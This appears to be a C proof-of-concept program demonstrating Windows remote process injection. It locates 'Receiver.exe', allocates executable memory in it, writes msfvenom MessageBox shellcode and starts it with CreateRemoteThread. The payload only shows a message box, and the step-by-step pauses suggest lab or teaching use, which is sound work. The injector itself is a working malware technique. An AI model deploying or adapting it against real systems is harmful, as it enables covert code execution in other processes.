#define WIN32_LEAN_AND_MEAN

#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <tlhelp32.h>

// for later usage

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

// 32 bit process
// for 64 bit process replace the shellcode with 64bit version
#define PROCESS_NAME "Receiver.exe"

int __cdecl main(int argc, char **argv)

{
// default MessageBox 32bit shellcode from msfvenom

    unsigned char buf[] =
    "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
    "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
    "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
    "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
    "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
    "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
    "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
    "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
    "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
    "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
    "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
    "\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
    "\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
    "\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
    "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
    "\x68\x2e\x2e\x2e\x58\x68\x63\x65\x73\x73\x68\x20\x70\x72\x6f"
    "\x68\x63\x74\x65\x64\x68\x69\x6e\x6a\x65\x68\x72\x6f\x6d\x20"
    "\x68\x6f\x78\x20\x66\x68\x4d\x73\x67\x42\x31\xc9\x88\x4c\x24"
    "\x1f\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
    "\x55\x08";

    DWORD dwFlag = 0x00000002;
    DWORD ProcessID = 0x00000000;
    DWORD threadID;
    DWORD wait;

    HANDLE hSnapshot;
    HANDLE hOpenProcess;
    HANDLE hThread;

    PROCESSENTRY32 ProcessInformation;

/*
    typedef struct tagPROCESSENTRY32 {
	    DWORD     dwSize;
	    DWORD     cntUsage;
	    DWORD     th32ProcessID;
	    ULONG_PTR th32DefaultHeapID;
	    DWORD     th32ModuleID;
	    DWORD     cntThreads;
	    DWORD     th32ParentProcessID;
	    LONG      pcPriClassBase;
	    DWORD     dwFlags;
	    CHAR      szExeFile[MAX_PATH];
    } PROCESSENTRY32;

*/

    ZeroMemory(&ProcessInformation,sizeof(PROCESSENTRY32));
    ProcessInformation.dwSize=sizeof(PROCESSENTRY32);

    printf("[+] struct PROCESSENTRY32 at: 0x%p\n",&ProcessInformation);
    printf("[+] Call CreateToolhelp32() ...\n");

    hSnapshot = CreateToolhelp32Snapshot(dwFlag,ProcessID);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32() failed...");
        return -1;

    }

    printf("[+] Looking for remote process: \"%s\" \n",PROCESS_NAME);
    printf("[+] Call Process32First() ...\n");

    if (!Process32First(hSnapshot,&ProcessInformation)) {
        printf("[-] Process32First() failed...");
        return -1;
    }

    // Skip First Process: SYSTEM Process with ID 0

    while (Process32Next(hSnapshot,&ProcessInformation)) {

        printf("[+] Call Process32Next() ...\n");

        if (strcmp(ProcessInformation.szExeFile,PROCESS_NAME) == 0) {
            printf("[+] FOUND:\n");
            printf("\n------------ Process information ---------------\n");
            printf("Name     : %s\n",ProcessInformation.szExeFile );
            printf("ID       : %08d\n",ProcessInformation.th32ProcessID);
            printf("Parent ID: %08d\n",ProcessInformation.th32ParentProcessID);
            printf("Number of threads: %08d\n",ProcessInformation.cntThreads);
            printf("\n------------ Process information ---------------\n");
            break;

        }

    }

    printf("\nCall OpenProcess() with ProcessID %d\n",ProcessInformation.th32ProcessID);
    hOpenProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessInformation.th32ProcessID);

    printf("\n\n[+] Press enter to write shellcode in remote process...\n");
    getchar();

    BOOL *exec;

// Own process
//    exec=VirtualAlloc(0,1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//    memcpy(exec, buf, strlen(buf));
//    printf("[+] Allocated address in own process: %p\n",exec);

// hThread=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec,0,0,&threadID);
// Remote process

    exec=VirtualAllocEx(hOpenProcess,0,2048, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

//    memcpy(exec, buf, strlen(buf));

    if (WriteProcessMemory(hOpenProcess,exec,buf,sizeof(buf),0) != 0) {
        printf("[+] Shellcode was successfully written in remote process...\n");
    }

    else {
        printf("[-] Writing in remote process failed...\n");
        return -1;
    }

    printf("[+] Press enter to execute own shellcode in remote process...\n");
    getchar();

    hThread=CreateRemoteThread(hOpenProcess,NULL, 0, (LPTHREAD_START_ROUTINE)exec,0,0,0);

//    wait = WaitForSingleObject(hThread,0);

    printf("[+] Instructions after thread...\n");
    printf("[+] Press enter to continue...\n");
    getchar();

    return 0;

}
